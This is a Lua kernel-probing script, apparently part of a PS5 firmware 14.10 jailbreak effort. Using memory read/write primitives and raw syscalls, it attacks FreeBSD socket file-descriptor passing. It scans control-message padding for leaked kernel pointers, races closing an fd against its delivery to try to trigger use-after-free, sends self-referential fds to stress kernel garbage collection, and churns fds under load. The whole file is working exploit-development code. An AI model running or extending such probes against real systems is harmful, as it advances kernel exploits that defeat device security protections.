-- CRASH_CLASS: MODERATE
-- PROBE 108a: SCM_RIGHTS fd passing + kernel object lifecycle attacks
--
-- Context: socketpair(AF_LOCAL) works on 14.10 (probe 20: 10 pairs created).
-- SCM_RIGHTS fd passing via sendmsg/recvmsg has NEVER been tested on PS5.
-- This exercises classic FreeBSD kernel exploit surfaces:
-- 1. cmsg padding kernel heap info leaks (multiple FreeBSD CVEs)
-- 2. fd refcount manipulation during close-while-queued
-- 3. Circular reference garbage collection bugs
-- 4. Cross-fd kqueue knote confusion via fd passing
--
-- Section A: Basic SCM_RIGHTS send/receive (LOW risk)
-- Section B: cmsg deep scan for kernel pointer leaks (LOW risk)
-- Section C: Close-before-receive fd lifecycle (MODERATE risk)
-- Section D: Self-referential fd send — circular ref GC (MODERATE risk)
-- Section E: Rapid fd churn + SCM_RIGHTS stress (MODERATE risk)
-- Section F: Multiple fds in one SCM_RIGHTS message (MODERATE risk)

print("=== PROBE 108a: SCM_RIGHTS FD PASSING + KERNEL LIFECYCLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local SYS_close      = 6
local SYS_getpid     = 20
local SYS_recvmsg    = 27
local SYS_sendmsg    = 28
local SYS_socket     = 97
local SYS_setsockopt = 105
local SYS_socketpair = 135
local SYS_kqueue     = 362
local SYS_kevent     = 363

local AF_LOCAL      = 1
local SOCK_STREAM   = 1
local SOL_SOCKET    = 0xFFFF
local SCM_RIGHTS    = 1
local SOL_LOCAL     = 0
local LOCAL_CREDS   = 2

-- CMSG layout (FreeBSD amd64): CMSG_ALIGN(sizeof(struct cmsghdr)) = 16
local CMSG_DATA_OFF = 16

local pid = to_num(make_syscall(SYS_getpid)())
print("pid: " .. pid)
print("")

----------------------------------------------------------------
-- Helpers
----------------------------------------------------------------
local function create_socketpair()
    local sv = memory.alloc(8)
    safe_wd(sv, 0)
    safe_wd(sv + 4, 0)
    local ok, ret = pcall(function()
        return make_syscall(SYS_socketpair)(uint64(AF_LOCAL), uint64(SOCK_STREAM),
            uint64(0), uint64(sv))
    end)
    if not ok then return nil, nil end
    if to_num(ret) ~= 0 then return nil, nil end
    return safe_rd(sv), safe_rd(sv + 4)
end

local function close_fd(fd)
    if fd == nil then return end
    pcall(function() make_syscall(SYS_close)(uint64(fd)) end)
end

local function send_fd_over(sock_fd, fd_to_send)
    local iov_data = memory.alloc(8)
    safe_wd(iov_data, 0x41) -- 'A'
    local iov = memory.alloc(0x10)
    safe_wq(iov, uint64(iov_data))
    safe_wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(0x20)
    for i = 0, 0x1F, 4 do safe_wd(cmsg + i, 0) end
    safe_wd(cmsg, 20)               -- cmsg_len = CMSG_LEN(4) = 16+4
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + CMSG_DATA_OFF, fd_to_send)

    local msg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(msg + i, 0) end
    safe_wq(msg, uint64(0))
    safe_wd(msg + 8, 0)
    safe_wq(msg + 0x10, uint64(iov))
    safe_wd(msg + 0x18, 1)
    safe_wq(msg + 0x20, uint64(cmsg))
    safe_wd(msg + 0x28, 24)         -- CMSG_SPACE(4) = 16+8
    safe_wd(msg + 0x2C, 0)

    local ok, ret = pcall(function()
        return make_syscall(SYS_sendmsg)(uint64(sock_fd), uint64(msg), uint64(0))
    end)
    if not ok then return nil end
    return to_num(ret)
end

local function recv_fd_from(sock_fd, buf_sz)
    buf_sz = buf_sz or 0x100
    local iov_data = memory.alloc(8)
    safe_wd(iov_data, 0)
    local iov = memory.alloc(0x10)
    safe_wq(iov, uint64(iov_data))
    safe_wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(buf_sz)
    for i = 0, buf_sz - 1, 4 do safe_wd(cmsg + i, 0xDEADBEEF) end

    local msg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(msg + i, 0) end
    safe_wq(msg, uint64(0))
    safe_wd(msg + 8, 0)
    safe_wq(msg + 0x10, uint64(iov))
    safe_wd(msg + 0x18, 1)
    safe_wq(msg + 0x20, uint64(cmsg))
    safe_wd(msg + 0x28, buf_sz)
    safe_wd(msg + 0x2C, 0)

    local ok, ret = pcall(function()
        return make_syscall(SYS_recvmsg)(uint64(sock_fd), uint64(msg), uint64(0))
    end)
    if not ok then return nil, cmsg, nil, nil end
    local rv = to_num(ret)
    local controllen = safe_rd(msg + 0x28)
    if rv < 0 or controllen == nil then return nil, cmsg, rv, controllen end
    local offset = 0
    while offset + CMSG_DATA_OFF <= math.min(controllen, buf_sz) do
        local len = safe_rd(cmsg + offset)
        local level = safe_rd(cmsg + offset + 4)
        local kind = safe_rd(cmsg + offset + 8)
        if len == nil or len < CMSG_DATA_OFF or offset + len > controllen then break end
        if level == SOL_SOCKET and kind == SCM_RIGHTS and len >= CMSG_DATA_OFF + 4 then
            return safe_rd(cmsg + offset + CMSG_DATA_OFF), cmsg, rv, controllen
        end
        offset = offset + math.floor((len + 7) / 8) * 8
    end
    return nil, cmsg, rv, controllen
end

-- ============================================================
-- SECTION A: Basic SCM_RIGHTS send/receive
-- ============================================================
print("--- SECTION A: BASIC SCM_RIGHTS ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then
        print("[A] socketpair FAILED")
        break
    end
    print("[A] socketpair: fd_a=" .. fd_a .. " fd_b=" .. fd_b)

    local ok_kq, kq_fd = pcall(function() return to_num(make_syscall(SYS_kqueue)()) end)
    if not ok_kq or kq_fd < 0 then
        print("[A] kqueue FAILED: " .. tostring(kq_fd))
        close_fd(fd_a); close_fd(fd_b)
        break
    end
    print("[A] kqueue fd=" .. kq_fd)

    local srv = send_fd_over(fd_b, kq_fd)
    print("[A] sendmsg ret=" .. tostring(srv))
    if srv == nil or srv < 0 then
        print("[A] sendmsg FAILED — SCM_RIGHTS blocked?")
        close_fd(fd_a); close_fd(fd_b); close_fd(kq_fd)
        break
    end

    local recv_fd, _, rrv, clen = recv_fd_from(fd_a, 0x100)
    print("[A] recvmsg ret=" .. tostring(rrv) .. " controllen=" .. tostring(clen))
    print("[A] received fd=" .. tostring(recv_fd))

    if recv_fd ~= nil and recv_fd >= 0 then
        print("[A] *** SCM_RIGHTS WORKS ON PS5 14.10! ***")
        print("[A] original kq=" .. kq_fd .. " received as fd=" .. recv_fd)

        local ok_kev, kev_rv = pcall(function()
            return to_num(make_syscall(SYS_kevent)(uint64(recv_fd), uint64(0), uint64(0),
                uint64(memory.alloc(0x40)), uint64(0), uint64(0)))
        end)
        print("[A] kevent on received fd: ok=" .. tostring(ok_kev) .. " rv=" .. tostring(kev_rv))
        close_fd(recv_fd)
    else
        print("[A] SCM_RIGHTS receive FAILED")
    end

    close_fd(kq_fd); close_fd(fd_a); close_fd(fd_b)
until true
print("")

-- ============================================================
-- SECTION B: cmsg deep scan for kernel pointer leaks
-- ============================================================
print("--- SECTION B: CMSG DEEP SCAN ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then print("[B] socketpair FAILED"); break end

    local ok_s, test_fd = pcall(function()
        return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not ok_s or test_fd < 0 then
        print("[B] test socket FAILED")
        close_fd(fd_a); close_fd(fd_b); break
    end

    -- Enable LOCAL_CREDS to get extra cmsg data from kernel
    local one_buf = memory.alloc(4)
    safe_wd(one_buf, 1)
    local ok_opt, opt_rv = pcall(function()
        return to_num(make_syscall(SYS_setsockopt)(uint64(fd_a), uint64(SOL_LOCAL),
            uint64(LOCAL_CREDS), uint64(one_buf), uint64(4)))
    end)
    print("[B] LOCAL_CREDS setsockopt: ok=" .. tostring(ok_opt) .. " rv=" .. tostring(opt_rv))

    local srv = send_fd_over(fd_b, test_fd)
    print("[B] sendmsg ret=" .. tostring(srv))
    if srv == nil or srv < 0 then
        print("[B] sendmsg FAILED")
        close_fd(fd_a); close_fd(fd_b); close_fd(test_fd); break
    end

    local recv_fd, cmsg_buf, rrv, clen = recv_fd_from(fd_a, 0x200)
    print("[B] recvmsg ret=" .. tostring(rrv) .. " controllen=" .. tostring(clen))
    print("[B] received fd=" .. tostring(recv_fd))

    local kptr_count = 0
    local interesting = 0
    if clen ~= nil and clen > 0 then
        print("[B] scanning " .. clen .. " bytes of cmsg data:")
        local offset = 0
        while offset < clen do
            local cmsg_len   = safe_rd(cmsg_buf + offset)
            local cmsg_level = safe_rd(cmsg_buf + offset + 4)
            local cmsg_type  = safe_rd(cmsg_buf + offset + 8)
            print("[B]   cmsg@+" .. string.format("%02X", offset) ..
                  " len=" .. tostring(cmsg_len) ..
                  " level=0x" .. string.format("%X", cmsg_level or 0) ..
                  " type=" .. tostring(cmsg_type))

            if cmsg_len == nil or cmsg_len < 12 then break end
            local aligned = cmsg_len
            if aligned % 8 ~= 0 then aligned = aligned + (8 - aligned % 8) end

            for i = 0, aligned - 1, 8 do
                local qv = safe_rq(cmsg_buf + offset + i)
                if qv ~= nil then
                    local h, l = get_hi_lo(qv)
                    local m = ""
                    if is_kptr(qv) then
                        m = " *** KERNEL POINTER ***"
                        kptr_count = kptr_count + 1
                    elseif h ~= 0 and h ~= 0xFFFFFFFF and h ~= 0xDEADBEEF then
                        m = " [non-zero-hi]"
                        interesting = interesting + 1
                    end
                    print("[B]     +" .. string.format("%02X", offset + i) .. ": " .. fmt_addr(qv) .. m)
                end
            end
            offset = offset + aligned
        end

        -- Scan past stated controllen for stale heap data
        print("[B] past-controllen scan:")
        for i = clen, math.min(clen + 64, 0x1FF), 8 do
            local qv = safe_rq(cmsg_buf + i)
            if qv ~= nil then
                local h, l = get_hi_lo(qv)
                if h ~= 0xDEADBEEF and (h ~= 0 or l ~= 0) then
                    local m = ""
                    if is_kptr(qv) then
                        m = " *** KERNEL POINTER ***"; kptr_count = kptr_count + 1
                    end
                    print("[B]     +" .. string.format("%02X", i) .. ": " .. fmt_addr(qv) .. m)
                end
            end
        end
    end
    print("[B] kernel ptrs: " .. kptr_count .. "  interesting: " .. interesting)

    close_fd(recv_fd); close_fd(test_fd); close_fd(fd_a); close_fd(fd_b)
until true
print("")

-- ============================================================
-- SECTION C: Close-before-receive fd lifecycle
-- ============================================================
print("--- SECTION C: CLOSE-BEFORE-RECEIVE ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then print("[C] socketpair FAILED"); break end

    local ok_kq, tgt = pcall(function() return to_num(make_syscall(SYS_kqueue)()) end)
    if not ok_kq or tgt < 0 then
        print("[C] kqueue FAILED"); close_fd(fd_a); close_fd(fd_b); break
    end
    print("[C] target kqueue fd=" .. tgt)

    local srv = send_fd_over(fd_b, tgt)
    print("[C] sendmsg ret=" .. tostring(srv))
    if srv == nil or srv < 0 then
        close_fd(fd_a); close_fd(fd_b); close_fd(tgt); break
    end

    -- CLOSE the original BEFORE receiving
    print("[C] closing original fd " .. tgt .. " BEFORE receive")
    close_fd(tgt)

    -- Try to reuse the fd number
    local reuse = {}
    for i = 1, 5 do
        local ok_r, nfd = pcall(function() return to_num(make_syscall(SYS_kqueue)()) end)
        if ok_r and nfd >= 0 then
            table.insert(reuse, nfd)
            if nfd == tgt then
                print("[C] *** fd " .. tgt .. " REUSED by new kqueue ***")
            end
        end
    end
    print("[C] reuse fds: " .. table.concat(reuse, ","))

    -- Receive the SCM_RIGHTS message (kernel still holds the ref)
    local recv_fd, _, rrv = recv_fd_from(fd_a, 0x100)
    print("[C] recvmsg ret=" .. tostring(rrv) .. " received fd=" .. tostring(recv_fd))

    if recv_fd ~= nil and recv_fd >= 0 then
        print("[C] *** GOT FD AFTER CLOSE! fd=" .. recv_fd .. " ***")
        local ok_kev, kev_rv = pcall(function()
            return to_num(make_syscall(SYS_kevent)(uint64(recv_fd), uint64(0), uint64(0),
                uint64(memory.alloc(0x40)), uint64(0), uint64(0)))
        end)
        print("[C] kevent on received fd: ok=" .. tostring(ok_kev) .. " rv=" .. tostring(kev_rv))

        for _, rfd in ipairs(reuse) do
            if rfd == recv_fd then
                print("[C] *** COLLISION: recv fd matches reuse fd! ***")
            end
        end
        close_fd(recv_fd)
    end

    for _, rfd in ipairs(reuse) do close_fd(rfd) end
    close_fd(fd_a); close_fd(fd_b)
until true
print("")

-- ============================================================
-- SECTION D: Self-referential fd send (circular reference GC)
-- ============================================================
print("--- SECTION D: SELF-REFERENTIAL FD SEND ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then print("[D] socketpair FAILED"); break end
    print("[D] socketpair: fd_a=" .. fd_a .. " fd_b=" .. fd_b)

    -- Send fd_b OVER fd_b itself
    print("[D] send fd_b=" .. fd_b .. " over fd_b (self-ref)...")
    local srv1 = send_fd_over(fd_b, fd_b)
    print("[D] self-send ret=" .. tostring(srv1))

    -- Send fd_a OVER fd_a
    print("[D] send fd_a=" .. fd_a .. " over fd_a (self-ref)...")
    local srv2 = send_fd_over(fd_a, fd_a)
    print("[D] self-send ret=" .. tostring(srv2))

    -- Cross-reference: send fd_a over fd_b
    print("[D] send fd_a=" .. fd_a .. " over fd_b=" .. fd_b .. " (cross-ref)...")
    local srv3 = send_fd_over(fd_b, fd_a)
    print("[D] cross-send ret=" .. tostring(srv3))

    -- Receive all — stresses kernel GC for circular references
    if srv1 ~= nil and srv1 >= 0 then
        local r1, _, rv1 = recv_fd_from(fd_a, 0x80)
        print("[D] recv self-ref fd_b: rv=" .. tostring(rv1) .. " fd=" .. tostring(r1))
        if r1 ~= nil and r1 >= 0 then close_fd(r1) end
    end
    if srv2 ~= nil and srv2 >= 0 then
        local r2, _, rv2 = recv_fd_from(fd_b, 0x80)
        print("[D] recv self-ref fd_a: rv=" .. tostring(rv2) .. " fd=" .. tostring(r2))
        if r2 ~= nil and r2 >= 0 then close_fd(r2) end
    end
    if srv3 ~= nil and srv3 >= 0 then
        local r3, _, rv3 = recv_fd_from(fd_a, 0x80)
        print("[D] recv cross-ref fd_a: rv=" .. tostring(rv3) .. " fd=" .. tostring(r3))
        if r3 ~= nil and r3 >= 0 then close_fd(r3) end
    end

    -- Close originals last — kernel GC must handle circular refs
    print("[D] closing originals (GC test)...")
    close_fd(fd_a); close_fd(fd_b)
    print("[D] close complete (no panic = GC OK)")
until true
print("")

-- ============================================================
-- SECTION E: Rapid fd churn + SCM_RIGHTS stress
-- ============================================================
print("--- SECTION E: FD CHURN STRESS ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then print("[E] socketpair FAILED"); break end
    print("[E] socketpair: fd_a=" .. fd_a .. " fd_b=" .. fd_b)

    local ok_count = 0
    local leak_count = 0

    for round = 1, 20 do
        local ok_kq, kq = pcall(function() return to_num(make_syscall(SYS_kqueue)()) end)
        if not ok_kq or kq < 0 then break end

        local srv = send_fd_over(fd_b, kq)
        if srv == nil or srv < 0 then close_fd(kq); break end

        close_fd(kq) -- close original immediately

        local recv_fd, cmsg_buf, rrv, clen = recv_fd_from(fd_a, 0x80)
        if recv_fd ~= nil and recv_fd >= 0 then
            ok_count = ok_count + 1
            -- Quick kernel pointer scan on cmsg padding
            if clen ~= nil and clen > 20 then
                for i = 20, clen - 1, 8 do
                    local qv = safe_rq(cmsg_buf + i)
                    if is_kptr(qv) then
                        print("[E] *** KPTR round " .. round .. " +" ..
                              string.format("%02X", i) .. ": " .. fmt_addr(qv) .. " ***")
                        leak_count = leak_count + 1
                    end
                end
            end
            close_fd(recv_fd)
        end
    end

    print("[E] " .. ok_count .. "/20 send-close-receive cycles OK")
    print("[E] kernel ptr leaks: " .. leak_count)

    close_fd(fd_a); close_fd(fd_b)
until true
print("")

-- ============================================================
-- SECTION F: Multiple fds in one SCM_RIGHTS message
-- ============================================================
print("--- SECTION F: MULTI-FD SCM_RIGHTS ---")
print("")

repeat
    local fd_a, fd_b = create_socketpair()
    if fd_a == nil then print("[F] socketpair FAILED"); break end

    local fds = {}
    for i = 1, 4 do
        local ok_kq, kq = pcall(function() return to_num(make_syscall(SYS_kqueue)()) end)
        if ok_kq and kq >= 0 then table.insert(fds, kq) end
    end
    print("[F] created " .. #fds .. " fds: " .. table.concat(fds, ","))
    if #fds < 4 then
        for _, f in ipairs(fds) do close_fd(f) end
        close_fd(fd_a); close_fd(fd_b); break
    end

    -- Build cmsg for 4 fds: CMSG_LEN(16)=32, CMSG_SPACE(16)=32
    local iov_data = memory.alloc(8)
    safe_wd(iov_data, 0x42)
    local iov = memory.alloc(0x10)
    safe_wq(iov, uint64(iov_data))
    safe_wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(0x40)
    for i = 0, 0x3F, 4 do safe_wd(cmsg + i, 0) end
    safe_wd(cmsg, 32)               -- cmsg_len = 16 + 16
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    for i, fd in ipairs(fds) do
        safe_wd(cmsg + CMSG_DATA_OFF + (i-1)*4, fd)
    end

    local msg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(msg + i, 0) end
    safe_wq(msg, uint64(0))
    safe_wd(msg + 8, 0)
    safe_wq(msg + 0x10, uint64(iov))
    safe_wd(msg + 0x18, 1)
    safe_wq(msg + 0x20, uint64(cmsg))
    safe_wd(msg + 0x28, 32)
    safe_wd(msg + 0x2C, 0)

    local ok_s, srv = pcall(function()
        return to_num(make_syscall(SYS_sendmsg)(uint64(fd_b), uint64(msg), uint64(0)))
    end)
    print("[F] sendmsg 4 fds: ok=" .. tostring(ok_s) .. " ret=" .. tostring(srv))

    -- Close all originals before receiving
    for _, fd in ipairs(fds) do close_fd(fd) end
    print("[F] closed all 4 originals")

    if not ok_s or srv == nil or srv < 0 then
        print("[F] receive skipped because sendmsg failed")
        close_fd(fd_a); close_fd(fd_b)
        break
    end

    -- Receive with large buffer
    local rcmsg = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(rcmsg + i, 0xDEADBEEF) end
    local riov_d = memory.alloc(8)
    local riov = memory.alloc(0x10)
    safe_wq(riov, uint64(riov_d))
    safe_wq(riov + 8, uint64(1))
    local rmsg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(rmsg + i, 0) end
    safe_wq(rmsg, uint64(0))
    safe_wq(rmsg + 0x10, uint64(riov))
    safe_wd(rmsg + 0x18, 1)
    safe_wq(rmsg + 0x20, uint64(rcmsg))
    safe_wd(rmsg + 0x28, 0x100)

    local ok_r, rrv = pcall(function()
        return to_num(make_syscall(SYS_recvmsg)(uint64(fd_a), uint64(rmsg), uint64(0)))
    end)
    local actual_clen = safe_rd(rmsg + 0x28)
    print("[F] recvmsg: ok=" .. tostring(ok_r) .. " ret=" .. tostring(rrv) ..
          " controllen=" .. tostring(actual_clen))

    if actual_clen ~= nil and actual_clen >= 32 then
        local rfds = {}
        for i = 0, 3 do
            local rfd = safe_rd(rcmsg + CMSG_DATA_OFF + i*4)
            table.insert(rfds, rfd or -1)
        end
        print("[F] received fds: " .. table.concat(rfds, ","))

        for _, rfd in ipairs(rfds) do
            if rfd >= 0 then
                local ok_kev, kev_rv = pcall(function()
                    return to_num(make_syscall(SYS_kevent)(uint64(rfd), uint64(0), uint64(0),
                        uint64(memory.alloc(0x40)), uint64(0), uint64(0)))
                end)
                print("[F]   fd " .. rfd .. " kevent: ok=" .. tostring(ok_kev) .. " rv=" .. tostring(kev_rv))
                close_fd(rfd)
            end
        end
    end

    -- Full cmsg hex dump
    if actual_clen ~= nil and actual_clen > 0 then
        print("[F] cmsg dump:")
        for i = 0, math.min(actual_clen + 16, 0x7F), 8 do
            local qv = safe_rq(rcmsg + i)
            local m = ""
            if is_kptr(qv) then m = " *** KPTR ***" end
            print("[F]   +" .. string.format("%02X", i) .. ": " .. fmt_addr(qv) .. m)
        end
    end

    close_fd(fd_a); close_fd(fd_b)
until true

print("")
print("=== PROBE 108a COMPLETE ===")
